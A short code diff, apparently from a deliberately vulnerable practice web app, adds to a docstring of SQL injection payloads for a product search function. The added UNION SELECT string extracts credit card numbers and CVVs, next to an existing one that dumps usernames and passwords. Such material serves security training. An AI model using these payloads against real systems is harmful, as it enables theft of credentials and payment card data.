@@ -86,6 +86,9 @@ def Search(product):
 
     GET ALL USER CREDENTIALS (After knowing fields in user table)
     ' UNION SELECT '1', username, '3', '4', password, '6', '7' FROM users--
+
+    GET CREDIT CARD DETAILS
+    ' UNION SELECT '1', ccnumber, '3', '4', cvv, '6', '7' FROM paymentdetails--
     """
 
     # Search Form
